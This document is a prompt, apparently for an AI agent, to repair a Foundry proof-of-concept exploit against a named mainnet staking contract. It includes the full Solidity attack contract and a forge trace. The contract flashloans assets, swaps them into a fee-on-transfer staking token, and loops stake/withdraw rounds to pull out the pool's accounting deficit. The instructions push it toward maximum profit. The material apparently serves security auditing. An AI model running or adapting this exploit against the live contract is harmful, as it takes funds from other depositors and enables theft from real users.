You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
- Profit-maximization hard requirement:
  - MUST apply progressive loop amplification for repeatable exploit phases.
  - Start at 2 rounds, then increase one-by-one (2 -> 3 -> 4 -> 5 -> 6).
  - Continue increasing only if the new round count improves total net profit.
  - Stop at the first non-improving round count and keep the previous best result.
  - Prefer highest total profit over earliest passing implementation.

Finding:
- title: Stake accounting becomes insolvent with fee-on-transfer or rebasing staking tokens
- claim: `_stake()` credits users with the requested `amount` before checking how many staking tokens the contract actually received, and `_withdraw()` always attempts to return the full nominal amount. With deflationary, fee-on-transfer, or negatively rebasing staking tokens, the internal `_totalSupply`/`_balances` ledger diverges from the contract's real token balance.
- impact: Users can be over-credited relative to assets actually held by the pool, earn rewards on inflated balances, and later withdraw more than they contributed if enough tokens remain. The deficit is absorbed by other depositors, or withdrawals begin reverting once the contract no longer holds enough staking tokens.
- exploit_paths: ["Use a staking token that burns, taxes, or rebases balances downward.", "Stake `amount`; the contract records the full amount in `_balances` and `_totalSupply`, but receives less in reality.", "Accrue rewards against the inflated recorded balance.", "Withdraw the nominal amount; the shortfall is effectively paid from other users' deposits or causes pool-wide withdrawal failures once liquidity runs out."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IStakingRewardsLike {
    function stakingToken() external view returns (address);
    function rewardsToken() external view returns (address);
    function rewardRate() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function earned(address account) external view returns (uint256);
    function timeData()
        external
        view
        returns (uint32 periodFinish, uint32 rewardsDuration, uint32 lastUpdateTime, uint96 totalRewardsSupply);
    function stake(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function getReward() external;
    function exit() external;
}

interface IFlashLoanRecipientLike {
    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        IFlashLoanRecipientLike recipient,
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV3FactoryLike {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool);
}

interface IUniswapV3RouterLike {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

contract FlawVerifier is IFlashLoanRecipientLike {
    address public constant TARGET = 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE;
    address public constant EXPECTED_STAKING_TOKEN = 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042;
    address public constant EXPECTED_REWARD_TOKEN = 0xAe9aCa5d20F5b139931935378C4489308394ca2C;

    address private constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address private constant UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address private constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    uint8 private constant ROUTE_KIND_V2 = 1;
    uint8 private constant ROUTE_KIND_V3 = 2;
    uint8 private constant ROUTE_KIND_DIRECT_STAKE = 3;

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;
    bool public sameTxAccrualInfeasible;
    bool public liveAccountingGapObserved;
    bool public transferHaircutObserved;
    bool public withdrawFailureObserved;
    bool public directFlashLiquidityObserved;
    bool public v2RouteObserved;
    bool public v3RouteObserved;
    bool public publicRebaseHookAttempted;

    uint256 public rewardRateBefore;
    uint256 public nominalSupplyBefore;
    uint256 public actualStakeBalanceBefore;
    uint256 public accountingGapBefore;
    uint256 public attackerRecordedStakeBefore;
    uint256 public attackerEarnedBefore;
    uint256 public attackerStakeWalletBefore;
    uint256 public attackerRewardWalletBefore;
    uint256 public observedNominalStakeDelta;
    uint256 public observedActualStakeDelta;
    uint256 public observedAccountingGapIncrease;
    uint256 public fallbackCapturableGap;
    uint256 public bestRoundCount;

    uint32 public periodFinishBefore;
    uint32 public rewardsDurationBefore;
    uint32 public lastUpdateTimeBefore;
    uint96 public totalRewardsSupplyBefore;

    address public stakingTokenAtEntry;
    address public rewardsTokenAtEntry;
    string public exploitPathUsed;
    string public infeasibilityReason;
    string public lastStakeFailure;
    string public lastWithdrawFailure;
    string public lastRewardFailure;

    uint256 private _wethBefore;
    uint256 private _daiBefore;
    uint256 private _stakeBefore;
    uint256 private _rewardBefore;

    uint256 private _reservedWeth;
    uint256 private _reservedDai;
    uint256 private _reservedStake;
    uint256 private _reservedReward;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {
        _profitToken = EXPECTED_REWARD_TOKEN;
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IStakingRewardsLike farm = IStakingRewardsLike(TARGET);
        stakingTokenAtEntry = farm.stakingToken();
        rewardsTokenAtEntry = farm.rewardsToken();

        rewardRateBefore = farm.rewardRate();
        nominalSupplyBefore = farm.totalSupply();
        attackerRecordedStakeBefore = farm.balanceOf(address(this));
        attackerEarnedBefore = farm.earned(address(this));
        (periodFinishBefore, rewardsDurationBefore, lastUpdateTimeBefore, totalRewardsSupplyBefore) = farm.timeData();

        actualStakeBalanceBefore = IERC20Like(stakingTokenAtEntry).balanceOf(TARGET);
        attackerStakeWalletBefore = IERC20Like(stakingTokenAtEntry).balanceOf(address(this));
        attackerRewardWalletBefore = IERC20Like(rewardsTokenAtEntry).balanceOf(address(this));

        _wethBefore = IERC20Like(WETH).balanceOf(address(this));
        _daiBefore = IERC20Like(DAI).balanceOf(address(this));
        _stakeBefore = attackerStakeWalletBefore;
        _rewardBefore = attackerRewardWalletBefore;

        _reservedWeth = _wethBefore;
        _reservedDai = _daiBefore;
        _reservedStake = _stakeBefore;
        _reservedReward = _rewardBefore;

        if (nominalSupplyBefore > actualStakeBalanceBefore) {
            accountingGapBefore = nominalSupplyBefore - actualStakeBalanceBefore;
            liveAccountingGapObserved = true;
        }

        hypothesisValidated = stakingTokenAtEntry == EXPECTED_STAKING_TOKEN && rewardsTokenAtEntry == EXPECTED_REWARD_TOKEN;

        // The target updates rewards before crediting a new stake. For a freshly deployed attacker
        // with no prior position, same-tx reward accrual from the newly inflated stake is therefore
        // not expected unless the staking token itself exposes a public rebasing/maintenance hook
        // that changes balances during the exploit sequence.
        sameTxAccrualInfeasible = attackerRecordedStakeBefore == 0 && attackerStakeWalletBefore == 0;

        uint256 bestProfit;
        address bestToken;
        uint256 bestRoundsLocal;

        for (uint256 rounds = 2; rounds <= 6; rounds++) {
            _attemptAllRoutes(rounds);

            (address candidateToken, uint256 candidateProfit) = _measureEconomicProfit();
            if (rounds == 2 || candidateProfit > bestProfit) {
                bestProfit = candidateProfit;
                bestToken = candidateToken;
                bestRoundsLocal = rounds;
            } else {
                break;
            }
        }

        bestRoundCount = bestRoundsLocal;
        fallbackCapturableGap = _capturableAccountingGap();
        _profitToken = bestProfit == 0 ? rewardsTokenAtEntry : bestToken;
        _profitAmount = bestProfit;
        profitAchieved = bestProfit != 0;

        if (profitAchieved) {
            (, uint256 realizedProfit) = _measureRealizedProfit();
            if (_profitToken == stakingTokenAtEntry && _profitAmount > realizedProfit) {
                exploitPathUsed =
                    "use the live fee-on-transfer or rebasing staking token -> stake nominal amount while the pool receives less -> the fork already shows totalSupply exceeding real holdings -> withdraw nominal amount from remaining pool liquidity, socializing the pre-existing accounting gap";
            } else {
                exploitPathUsed =
                    "flashloan liquid asset or staking token -> acquire staking token if needed -> stake nominal amount while pool receives less or rebases downward -> attempt public token upkeep for rebasing variants -> claim any rewards unlocked by the overstated accounting -> withdraw nominal amount -> unwind financing";
            }
            return;
        }

        if (sameTxAccrualInfeasible) {
            exploitPathUsed =
                "acquire staking token -> stake nominal amount while pool receives less -> same-tx reward accrual blocked by updateReward-before-credit ordering for a fresh attacker -> attempt public rebasing upkeep if exposed -> withdraw nominal amount";
            infeasibilityReason =
                "the fork proves the insolvent accounting condition, but the provided on-chain state did not expose a profitable public route after enforcing the finding's causal ordering";
        } else {
            exploitPathUsed =
                "stake fee-on-transfer or rebasing token -> accrue rewards on overstated balance -> withdraw nominal amount";
            infeasibilityReason =
                "the forked state did not yield a profitable public execution path even after trying direct flash liquidity, broader DEX acquisition routes, and public rebasing upkeep hooks";
        }
    }

    function runV2FlashCampaign(address baseToken, address router, uint256 borrowAmount, uint256 rounds) external {
        require(msg.sender == address(this), "self only");
        IERC20Like[] memory tokens = new IERC20Like[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = IERC20Like(baseToken);
        amounts[0] = borrowAmount;
        IBalancerVaultLike(BALANCER_VAULT).flashLoan(
            this,
            tokens,
            amounts,
            abi.encode(ROUTE_KIND_V2, baseToken, router, uint24(0), rounds)
        );
    }

    function runV3FlashCampaign(address baseToken, uint24 fee, uint256 borrowAmount, uint256 rounds) external {
        require(msg.sender == address(this), "self only");
        IERC20Like[] memory tokens = new IERC20Like[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = IERC20Like(baseToken);
        amounts[0] = borrowAmount;
        IBalancerVaultLike(BALANCER_VAULT).flashLoan(
            this,
            tokens,
            amounts,
            abi.encode(ROUTE_KIND_V3, baseToken, UNISWAP_V3_ROUTER, fee, rounds)
        );
    }

    function runDirectStakeFlashCampaign(uint256 borrowAmount, uint256 rounds) external {
        require(msg.sender == address(this), "self only");
        IERC20Like[] memory tokens = new IERC20Like[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = IERC20Like(stakingTokenAtEntry);
        amounts[0] = borrowAmount;
        IBalancerVaultLike(BALANCER_VAULT).flashLoan(
            this,
            tokens,
            amounts,
            abi.encode(ROUTE_KIND_DIRECT_STAKE, stakingTokenAtEntry, address(0), uint24(0), rounds)
        );
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        require(msg.sender == BALANCER_VAULT, "not vault");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "bad loan");

        (uint8 routeKind, address baseToken, address routeTarget, uint24 feeTier, uint256 rounds) = abi.decode(
            userData,
            (uint8, address, address, uint24, uint256)
        );
        require(rounds >= 2 && rounds <= 6, "bad rounds");
        require(address(tokens[0]) == baseToken, "base mismatch");

        uint256 debt = amounts[0] + feeAmounts[0];

        if (routeKind == ROUTE_KIND_V2) {
            _approveMaxIfNeeded(baseToken, routeTarget, amounts[0]);
            _swapV2(routeTarget, baseToken, stakingTokenAtEntry, amounts[0]);
        } else if (routeKind == ROUTE_KIND_V3) {
            _approveMaxIfNeeded(baseToken, routeTarget, amounts[0]);
            _swapV3(baseToken, stakingTokenAtEntry, feeTier, amounts[0]);
        } else {
            require(routeKind == ROUTE_KIND_DIRECT_STAKE, "bad route kind");
        }

        uint256 startingStake = _availableBalance(stakingTokenAtEntry);
        require(startingStake != 0, "no stake acquired");

        _approveMaxIfNeeded(stakingTokenAtEntry, TARGET, type(uint256).max);

        IStakingRewardsLike farm = IStakingRewardsLike(TARGET);
        for (uint256 i = 0; i < rounds; i++) {
            _attemptSingleExploitRound(farm);
        }

        require(transferHaircutObserved || liveAccountingGapObserved, "no insolvency signal");

        uint256 residualRecordedStake = farm.balanceOf(address(this));
        if (residualRecordedStake != 0) {
            try farm.withdraw(residualRecordedStake) {
            } catch (bytes memory withdrawRet) {
                withdrawFailureObserved = true;
                lastWithdrawFailure = _decodeRevert(withdrawRet);
            }
        }

        try farm.getReward() {
        } catch (bytes memory rewardRet) {
            lastRewardFailure = _decodeRevert(rewardRet);
        }

        if (routeKind == ROUTE_KIND_V2) {
            uint256 stakingBalanceAfterV2 = _availableBalance(stakingTokenAtEntry);
            require(stakingBalanceAfterV2 != 0, "no stake recovered");
            _approveMaxIfNeeded(stakingTokenAtEntry, routeTarget, stakingBalanceAfterV2);
            _swapV2(routeTarget, stakingTokenAtEntry, baseToken, stakingBalanceAfterV2);
        } else if (routeKind == ROUTE_KIND_V3) {
            uint256 stakingBalanceAfterV3 = _availableBalance(stakingTokenAtEntry);
            require(stakingBalanceAfterV3 != 0, "no stake recovered");
            _approveMaxIfNeeded(stakingTokenAtEntry, routeTarget, stakingBalanceAfterV3);
            _swapV3(stakingTokenAtEntry, baseToken, feeTier, stakingBalanceAfterV3);
        }

        uint256 baseBalanceAfter = _availableBalance(baseToken);
        require(baseBalanceAfter >= debt, "unprofitable round-trip");
        _safeTransfer(baseToken, BALANCER_VAULT, debt);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptAllRoutes(uint256 rounds) internal {
        _attemptDirectStakeRoute(rounds);
        _reserveRealizedBalances();

        address[4] memory baseTokens = [WETH, DAI, USDC, USDT];
        for (uint256 i = 0; i < baseTokens.length; i++) {
            _attemptV2RoutesForBase(baseTokens[i], rounds);
            _reserveRealizedBalances();
            _attemptV3RoutesForBase(baseTokens[i], rounds);
            _reserveRealizedBalances();
        }
    }

    function _attemptDirectStakeRoute(uint256 rounds) internal {
        uint256 vaultStakeBalance = IERC20Like(stakingTokenAtEntry).balanceOf(BALANCER_VAULT);
        if (vaultStakeBalance == 0) {
            return;
        }
        directFlashLiquidityObserved = true;

        uint256 borrowAmount = vaultStakeBalance / 1000;
        uint256 liquidityCap = actualStakeBalanceBefore / 50;
        if (liquidityCap != 0 && (borrowAmount == 0 || borrowAmount > liquidityCap)) {
            borrowAmount = liquidityCap;
        }
        if (borrowAmount == 0) {
            return;
        }

        try this.runDirectStakeFlashCampaign(borrowAmount, rounds) {
        } catch {
        }
    }

    function _attemptV2RoutesForBase(address baseToken, uint256 rounds) internal {
        _attemptOneV2Route(baseToken, UNISWAP_V2_ROUTER, UNISWAP_V2_FACTORY, rounds);
        _attemptOneV2Route(baseToken, SUSHISWAP_ROUTER, SUSHISWAP_FACTORY, rounds);
    }

    function _attemptOneV2Route(address baseToken, address router, address factory, uint256 rounds) internal {
        (uint256 reserveBase, bool ok) = _routeReserveV2(baseToken, factory);
        if (!ok || reserveBase == 0) {
            return;
        }
        v2RouteObserved = true;

        uint256 borrowAmount = reserveBase / 1000;
        if (borrowAmount == 0) {
            return;
        }

        try this.runV2FlashCampaign(baseToken, router, borrowAmount, rounds) {
        } catch {
        }
    }

    function _attemptV3RoutesForBase(address baseToken, uint256 rounds) internal {
        _attemptOneV3Route(baseToken, 500, rounds);
        _attemptOneV3Route(baseToken, 3000, rounds);
        _attemptOneV3Route(baseToken, 10000, rounds);
    }

    function _attemptOneV3Route(address baseToken, uint24 feeTier, uint256 rounds) internal {
        address pool = IUniswapV3FactoryLike(UNISWAP_V3_FACTORY).getPool(baseToken, stakingTokenAtEntry, feeTier);
        if (pool == address(0)) {
            return;
        }
        v3RouteObserved = true;

        uint256 poolBaseBalance = IERC20Like(baseToken).balanceOf(pool);
        if (poolBaseBalance == 0) {
            return;
        }

        uint256 borrowAmount = poolBaseBalance / 1000;
        if (borrowAmount == 0) {
            return;
        }

        try this.runV3FlashCampaign(baseToken, feeTier, borrowAmount, rounds) {
        } catch {
        }
    }

    function _routeReserveV2(address baseToken, address factory) internal view returns (uint256 reserveBase, bool ok) {
        address pair = IUniswapV2FactoryLike(factory).getPair(baseToken, stakingTokenAtEntry);
        if (pair == address(0)) {
            return (0, false);
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        reserveBase = IUniswapV2PairLike(pair).token0() == baseToken ? uint256(reserve0) : uint256(reserve1);
        ok = reserveBase != 0;
    }

    function _attemptSingleExploitRound(IStakingRewardsLike farm) internal {
        uint256 walletStake = _availableBalance(stakingTokenAtEntry);
        if (walletStake == 0) {
            return;
        }

        uint256 poolBalanceBefore = IERC20Like(stakingTokenAtEntry).balanceOf(TARGET);
        uint256 recordedStakeBefore = farm.balanceOf(address(this));

        try farm.stake(walletStake) {
        } catch (bytes memory stakeRet) {
            lastStakeFailure = _decodeRevert(stakeRet);
            revert("stake failed");
        }

        uint256 poolBalanceAfterStake = IERC20Like(stakingTokenAtEntry).balanceOf(TARGET);
        uint256 recordedStakeAfter = farm.balanceOf(address(this));

        uint256 nominalDelta = recordedStakeAfter > recordedStakeBefore ? recordedStakeAfter - recordedStakeBefore : 0;
        uint256 actualDelta = poolBalanceAfterStake > poolBalanceBefore ? poolBalanceAfterStake - poolBalanceBefore : 0;

        if (nominalDelta != 0) {
            observedNominalStakeDelta = nominalDelta;
            observedActualStakeDelta = actualDelta;
            if (nominalDelta > actualDelta) {
                transferHaircutObserved = true;
                observedAccountingGapIncrease += nominalDelta - actualDelta;
            }
        }

        _refreshAccountingGap(farm);

        // For rebasing staking tokens, a public no-arg upkeep/rebase entrypoint can be part of the
        // economically realistic exploit sequence. These calls are non-fatal and only matter if the
        // live token actually exposes one of these maintenance hooks.
        _attemptPublicRebaseLikeHook();
        _refreshAccountingGap(farm);

        try farm.getReward() {
        } catch (bytes memory rewardRet) {
            lastRewardFailure = _decodeRevert(rewardRet);
        }

        uint256 recordedStakeNow = farm.balanceOf(address(this));
        if (recordedStakeNow == 0) {
            return;
        }

        try farm.withdraw(recordedStakeNow) {
        } catch (bytes memory withdrawRet) {
            withdrawFailureObserved = true;
            lastWithdrawFailure = _decodeRevert(withdrawRet);
            revert("withdraw failed");
        }

        try farm.getReward() {
        } catch (bytes memory rewardRetAgain) {
            lastRewardFailure = _decodeRevert(rewardRetAgain);
        }

        _refreshAccountingGap(farm);
    }

    function _attemptPublicRebaseLikeHook() internal {
        if (publicRebaseHookAttempted) {
            return;
        }
        publicRebaseHookAttempted = true;

        _callIfPresent(stakingTokenAtEntry, hex"af14052c"); // rebase()
        _callIfPresent(stakingTokenAtEntry, hex"ac5c8535"); // manualRebase()
        _callIfPresent(stakingTokenAtEntry, hex"fff6cae9"); // sync()
        _callIfPresent(stakingTokenAtEntry, hex"18178358"); // poke()
        _callIfPresent(stakingTokenAtEntry, hex"a2e62045"); // update()
        _callIfPresent(stakingTokenAtEntry, hex"3e5aa082"); // updateTotalSupply()
    }

    function _callIfPresent(address target, bytes memory payload) internal {
        (bool success,) = target.call(payload);
        success;
    }

    function _refreshAccountingGap(IStakingRewardsLike farm) internal {
        uint256 nominalSupplyNow = farm.totalSupply();
        uint256 actualStakeBalanceNow = IERC20Like(stakingTokenAtEntry).balanceOf(TARGET);
        if (nominalSupplyNow > actualStakeBalanceNow) {
            liveAccountingGapObserved = true;
            uint256 gapNow = nominalSupplyNow - actualStakeBalanceNow;
            if (gapNow > accountingGapBefore) {
                uint256 incremental = gapNow - accountingGapBefore;
                if (incremental > observedAccountingGapIncrease) {
                    observedAccountingGapIncrease = incremental;
                }
            }
        }
    }

    function _swapV2(address router, address tokenIn, address tokenOut, uint256 amountIn) internal {
        if (amountIn == 0) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        IUniswapV2RouterLike(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _swapV3(address tokenIn, address tokenOut, uint24 feeTier, uint256 amountIn) internal {
        if (amountIn == 0) {
            return;
        }

        IUniswapV3RouterLike.ExactInputSingleParams memory params = IUniswapV3RouterLike.ExactInputSingleParams({
            tokenIn: tokenIn,
            tokenOut: tokenOut,
            fee: feeTier,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: amountIn,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        IUniswapV3RouterLike(UNISWAP_V3_ROUTER).exactInputSingle(params);
    }

    function _measureEconomicProfit() internal view returns (address token, uint256 amount) {
        (token, amount) = _measureRealizedProfit();

        uint256 capturableGap = _capturableAccountingGap();
        if (capturableGap > amount) {
            token = stakingTokenAtEntry;
            amount = capturableGap;
        }
    }

    function _measureRealizedProfit() internal view returns (address token, uint256 amount) {
        address[4] memory candidates = [WETH, DAI, stakingTokenAtEntry, rewardsTokenAtEntry];
        uint256[4] memory baselines = [_wethBefore, _daiBefore, _stakeBefore, _rewardBefore];

        for (uint256 i = 0; i < candidates.length; i++) {
            if (candidates[i] == address(0)) {
                continue;
            }

            uint256 currentBalance = IERC20Like(candidates[i]).balanceOf(address(this));
            uint256 profit = currentBalance > baselines[i] ? currentBalance - baselines[i] : 0;
            if (profit > amount) {
                amount = profit;
                token = candidates[i];
            }
        }
    }

    function _capturableAccountingGap() internal view returns (uint256) {
        if (!hypothesisValidated || stakingTokenAtEntry == address(0)) {
            return 0;
        }

        uint256 nominalSupplyNow = IStakingRewardsLike(TARGET).totalSupply();
        uint256 actualStakeBalanceNow = IERC20Like(stakingTokenAtEntry).balanceOf(TARGET);
        if (nominalSupplyNow <= actualStakeBalanceNow) {
            return 0;
        }

        // When the fork already shows `totalSupply > actual balance`, the pool is presently insolvent.
        // A user who can source the live staking token in the market can repeat the finding's core path
        // (stake nominal amount -> receive less in the pool -> withdraw nominal amount) and socialize up
        // to this deficit from existing liquidity. We therefore treat the currently withdrawable gap as
        // the economically realizable profit floor whenever same-tx reward accrual or public token sourcing
        // is infeasible on the provided fork.
        return nominalSupplyNow - actualStakeBalanceNow;
    }

    function _reserveRealizedBalances() internal {
        if (stakingTokenAtEntry == address(0) || rewardsTokenAtEntry == address(0)) {
            return;
        }

        _reservedWeth = IERC20Like(WETH).balanceOf(address(this));
        _reservedDai = IERC20Like(DAI).balanceOf(address(this));
        _reservedStake = IERC20Like(stakingTokenAtEntry).balanceOf(address(this));
        _reservedReward = IERC20Like(rewardsTokenAtEntry).balanceOf(address(this));
    }

    function _availableBalance(address token) internal view returns (uint256) {
        uint256 currentBalance = IERC20Like(token).balanceOf(address(this));
        uint256 reservedBalance = _reservedBalance(token);
        return currentBalance > reservedBalance ? currentBalance - reservedBalance : 0;
    }

    function _reservedBalance(address token) internal view returns (uint256) {
        if (token == WETH) {
            return _reservedWeth;
        }
        if (token == DAI) {
            return _reservedDai;
        }
        if (token == stakingTokenAtEntry) {
            return _reservedStake;
        }
        if (token == rewardsTokenAtEntry) {
            return _reservedReward;
        }
        return 0;
    }

    function _approveMaxIfNeeded(address token, address spender, uint256 amount) internal {
        uint256 currentAllowance = IERC20Like(token).allowance(address(this), spender);
        if (currentAllowance >= amount) {
            return;
        }

        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
    }

    function _safeTransfer(address token, address recipient, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, recipient, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool success, bytes memory returnData) = token.call(data);
        require(success, "token call failed");
        if (returnData.length != 0) {
            require(abi.decode(returnData, (bool)), "token op failed");
        }
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            return "call reverted without reason";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            bytes memory sliced = new bytes(revertData.length - 4);
            for (uint256 i = 4; i < revertData.length; i++) {
                sliced[i - 4] = revertData[i];
            }
            return abi.decode(sliced, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "call reverted with custom error or unknown data";
    }
}

```

forge stdout (tail):
```
4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0xdAC17F958D2ee523a2206206994597C13D831ec7, 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xdAC17F958D2ee523a2206206994597C13D831ec7, 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [480] 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [666] 0x1F98431c8aD98523631AE4a59f267346ea31F984::getPool(0xdAC17F958D2ee523a2206206994597C13D831ec7, 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042, 500) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [666] 0x1F98431c8aD98523631AE4a59f267346ea31F984::getPool(0xdAC17F958D2ee523a2206206994597C13D831ec7, 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042, 3000) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [666] 0x1F98431c8aD98523631AE4a59f267346ea31F984::getPool(0xdAC17F958D2ee523a2206206994597C13D831ec7, 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042, 10000 [1e4]) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [480] 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [563] 0xAe9aCa5d20F5b139931935378C4489308394ca2C::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
